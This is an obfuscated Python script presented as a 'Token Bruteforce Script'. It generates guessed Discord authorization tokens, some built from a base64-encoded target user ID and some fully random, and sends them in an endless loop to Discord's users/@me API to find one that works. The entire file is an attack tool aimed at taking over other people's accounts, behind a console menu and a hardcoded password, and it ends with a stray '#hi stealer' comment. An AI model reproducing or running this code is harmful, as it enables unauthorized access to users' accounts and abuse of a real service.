import sched ,time #line:1
import os #line:2
from urllib .request import urlopen ,Request #line:3
import base64 #line:4
import random #line:5
import string #line:6
import requests #line:7
from colorama import *#line:8
import sys #line:9
from tkinter import messagebox #line:10
import re #line:11
import json #line:12
def banner ():#line:14
    print ("")#line:15
    print (f"{Fore.CYAN}")#line:16
    print (f"""       __ __          
_________|  | _____   
\___  /  |  | \__  \  
 /   /|  |  |__/ __ \_
/____ \__|____/____  /
     \/            \/ """)#line:22
    print ("___                   __                                                                             ")#line:23
    print ("\_ |__ _______ __ ___/  |_  ____  ")#line:24
    print ("| __ \\_  __ \  |  \   __\/ __ \                                                                    ")#line:25
    print ("| \_\ \|  | \/  |  /|  | \  ___/                                                                  ")#line:26
    print ("|___  /|__|  |____/ |__|  \___ /                                                                ")#line:27
    print ("|___  /|__|  |____/ |__|  \___ /                                                                ")#line:28
    print ("    \/                        /                                                                  ")#line:29
    print ("")#line:30
def idbf ():#line:34
    print (f"{Fore.BLUE}[$]{Style.RESET_ALL}    ID:",end =" ")#line:35
    O00O0OO00O0O0OO0O =input ()#line:36
    if (O00O0OO00O0O0OO0O .isdigit ()):#line:37
        if (len (O00O0OO00O0O0OO0O )==18 ):#line:38
            O0000O0O0OO0O0000 =O00O0OO00O0O0OO0O .encode ("UTF-8")#line:39
            O0O0O0OO0O000O0O0 =base64 .b64encode (O0000O0O0OO0O0000 )#line:40
            OOO00O00O0O0O00O0 =O0O0O0OO0O000O0O0 .decode ("UTF-8")#line:41
            print (f'{Fore.BLUE}[$]{Style.RESET_ALL}    Valid ID press enter to bruteforce')#line:42
            O0O0000OO0OOOO000 =input ()#line:43
            if (O0O0000OO0OOOO000 ==""):#line:44
                OOO0O00OOOO000000 ="https://discordapp.com/api/v6/users/@me"#line:45
                def O00O0000000OO00O0 ():#line:47
                    O0O0O0O000O0O0000 =""#line:48
                    while True :#line:49
                        try :#line:50
                            OOOOO00OOO00000O0 =list (['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0','.','_'])#line:52
                            O0O0O0O000O0O0000 =OOO00O00O0O0O00O0 +('').join (random .choices (OOOOO00OOO00000O0 ,k =35 ))#line:53
                            OO000OOOOO0O000OO ={'Authorization':O0O0O0O000O0O0000 ,'Content-Type':'application/json'}#line:55
                            O00000O00O0O00O0O =requests .get (OOO0O00OOOO000000 ,headers =OO000OOOOO0O000OO )#line:56
                            if O00000O00O0O00O0O .status_code ==401 :#line:58
                                print (f"{Fore.RED}[$]{Style.RESET_ALL}    {Fore.RED}Invalid:{Style.RESET_ALL} {O0O0O0O000O0O0000}")#line:59
                            elif O00000O00O0O00O0O .status_code ==200 :#line:61
                                print (f"{Fore.GREEN}[$]{Style.RESET_ALL}    {Fore.GREEN}Valid:{Style.RESET_ALL} {O0O0O0O000O0O0000}")#line:62
                                messagebox .showinfo (message =f"¡Token find!",title ="[$] Token Bruteforce Script by zila.ds4#5650")#line:63
                                break #line:64
                        except KeyboardInterrupt :#line:66
                            print ("")#line:67
                            print (f"{Fore.CYAN}[$]{Style.RESET_ALL}    Bruteforce end")#line:68
                            break #line:69
                O00O0000000OO00O0 ()#line:70
        else :#line:71
            print (f"{Fore.CYAN}[$]{Style.RESET_ALL}    ID invalid")#line:72
            O00O0OO0O0O0O0OOO =input ()#line:73
            if (O00O0OO0O0O0O0OOO ==""):#line:74
                idbf ()#line:75
            else :#line:76
                idbf ()#line:77
    else :#line:78
        print (f"{Fore.CYAN}[$]{Style.RESET_ALL}    ID invalid")#line:79
        O00O0OO0O0O0O0OOO =input ()#line:80
        if (O00O0OO0O0O0O0OOO ==""):#line:81
            idbf ()#line:82
        else :#line:83
            idbf ()#line:84
def randombf ():#line:86
            O00O000OO0OO0OOOO ="https://discordapp.com/api/v8/users/@me"#line:87
            def O00OOO0000O0O000O ():#line:89
                    O0O00O000000OO00O =""#line:90
                    while True :#line:91
                        try :#line:92
                            O0O0OOO0O000O0O0O =list (['1','2','3','4','5','6','7','8','9','0'])#line:93
                            OO0O000OO0O0O0000 =('').join (random .choices (O0O0OOO0O000O0O0O ,k =18 ))#line:94
                            OOOO0OOOO0O0O00O0 =OO0O000OO0O0O0000 .encode ("UTF-8")#line:95
                            OOO0O0OOO000OO000 =base64 .b64encode (OOOO0OOOO0O0O00O0 )#line:96
                            OOO0OOO0OO000O0OO =OOO0O0OOO000OO000 .decode ("UTF-8")#line:97
                            O0OOOO0OOO0O0OOOO =list (['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0','.','_'])#line:99
                            O0O00O000000OO00O =OOO0OOO0OO000O0OO +('').join (random .choices (O0OOOO0OOO0O0OOOO ,k =35 ))#line:100
                            O00O0OOO00OOO0000 ={'Authorization':O0O00O000000OO00O ,'Content-Type':'application/json'}#line:102
                            OOO000OO00OOOO0O0 =requests .get (O00O000OO0OO0OOOO ,headers =O00O0OOO00OOO0000 )#line:103
                            if OOO000OO00OOOO0O0 .status_code ==401 :#line:105
                                print (f"{Fore.RED}[$]{Style.RESET_ALL}    {Fore.RED}Invalid:{Style.RESET_ALL} {O0O00O000000OO00O}")#line:106
                            elif OOO000OO00OOOO0O0 .status_code ==200 :#line:108
                                print (f"{Fore.GREEN}[$]{Style.RESET_ALL}    {Fore.GREEN}Valid:{Style.RESET_ALL} {O0O00O000000OO00O}")#line:109
                                messagebox .showinfo (message =f"¡Token find!",title ="[$] Token Bruteforce Script by Zila ")#line:110
                        except KeyboardInterrupt :#line:111
                            print ("")#line:112
                            print (f"{Fore.CYAN}[$]{Style.RESET_ALL}    Bruteforce end")#line:113
                            break #line:114
            O00OOO0000O0O000O ()#line:117
def menu ():#line:119
    os .system ("@title   [$]  Token Bruteforce Script by zila.ds4#5650  && cls")#line:120
    banner ()#line:121
    print (f"{Fore.BLUE}[$]{Style.RESET_ALL}    Dev: Zi{Fore.BLUE}${Fore.WHITE}la <3")#line:122
    print ("")#line:123
    print (f"{Fore.BLUE}[$]{Style.RESET_ALL}    Choose a option: ")#line:124
    print ("")#line:125
    print (f"{Fore.BLUE}[1]{Style.RESET_ALL}    Token Bruteforce ID")#line:126
    print (f"{Fore.BLUE}[2]{Style.RESET_ALL}    Token Bruteforce random")#line:127
    print (f"{Fore.BLUE}[3]{Style.RESET_ALL}    Leave")#line:128
    print ("")#line:129
    print (f"{Fore.BLUE}[$]{Style.RESET_ALL}    Option: ",end ="")#line:130
    OOO0O00000OOO0O0O =input ()#line:131
    if (OOO0O00000OOO0O0O =="1"):#line:132
        idbf ()#line:133
    elif (OOO0O00000OOO0O0O =="2"):#line:134
        randombf ()#line:135
    elif (OOO0O00000OOO0O0O =="3"):#line:137
        os .system ("@title   [$]  Leave  && cls")#line:138
        banner ()#line:139
        print (f"{Fore.CYAN}[$]{Style.RESET_ALL}    thanks for using my script by Zila <3")#line:140
        time .sleep (3 )#line:141
        exit ()#line:142
    else :#line:143
        os .system ("@title   [$]  Acceso && cls")#line:144
        banner ()#line:145
        print (f"{Fore.CYAN}[$]{Style.RESET_ALL}    Option")#line:146
        O0O000O0O0O0OO0O0 =input ()#line:147
        if (O0O000O0O0O0OO0O0 ==""):#line:148
            menu ()#line:149
        else :#line:150
            menu ()#line:151
os .system ("@title   [$]  Conecting...  && cls")#line:154
banner ()#line:155
print (f"{Fore.BLUE}[$]{Style.RESET_ALL}    Dev:{Style.RESET_ALL} Zi{Fore.BLUE}${Fore.WHITE}la <3")#line:156
print ("")#line:157
print (f"{Fore.BLUE}[$]{Style.RESET_ALL}    Conecting...")#line:158
time .sleep (2 )#line:159
os .system ("@title   [$]  Token Bruteforce Script by zila.ds4#5650   && cls")#line:160
banner ()#line:161
print (f"{Fore.BLUE}[$]{Style.RESET_ALL}    Dev:{Style.RESET_ALL} Zi{Fore.BLUE}${Fore.WHITE}la <3")#line:162
print ("")#line:163
print (f"{Fore.BLUE}[$]{Style.RESET_ALL}    Password: ",end =f"{Fore.WHITE}")#line:164
contraseña =input ()#line:165
if (contraseña =="123"):#line:166
    os .system ("@title   [$]  Access  && cls")#line:167
    banner ()#line:168
    print (f"{Fore.BLUE}[$]{Style.RESET_ALL}    Acess .")#line:169
    time .sleep (3 )#line:170
    menu ()#line:171
else :#line:172
    os .system ("@title   [$]  No acess   && cls")#line:173
    banner ()#line:174
    print (f"{Fore.CYAN}[$]{Style.RESET_ALL}    No acess")#line:175
    q =input ()#line:176
    if (q ==""):#line:177
        os .system ('cls')#line:178
        sys .exit ()#line:179
    else :#line:180
        os .system ('cls')#line:181
        sys .exit ()#line:182




#hi stealer